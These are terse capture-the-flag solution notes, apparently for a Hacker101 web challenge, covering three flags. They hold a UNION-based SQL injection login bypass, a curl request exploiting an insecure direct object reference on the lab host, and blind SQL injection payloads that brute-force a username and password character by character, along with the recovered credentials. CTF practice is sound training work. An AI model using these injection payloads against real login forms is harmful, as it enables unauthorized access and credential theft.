FLAG1 (SQLI)
/page/3 403
username: admin ' UNION SELECT 'x' AS password FROM admins WHERE '1' = '1
password: x

FLAG2 (IDOR)
curl -v -X POST https://4a21f259872b8aa6429dd5cb2dd8c0dd.ctf.hacker101.com/page/edit/1

FLAG3 (BRUTEFORCE)
//to find the length of the credentials
' or LENGTH(username)=1#
' or LENGTH(password)=1#
//to find what are the credentials, char per char
admin ' or username LIKE '§_§§_§§_§§_§§_§§_§'#
admin ' or password LIKE '§_§§_§§_§§_§§_§§_§'#
username=5	colby
password=6	delmar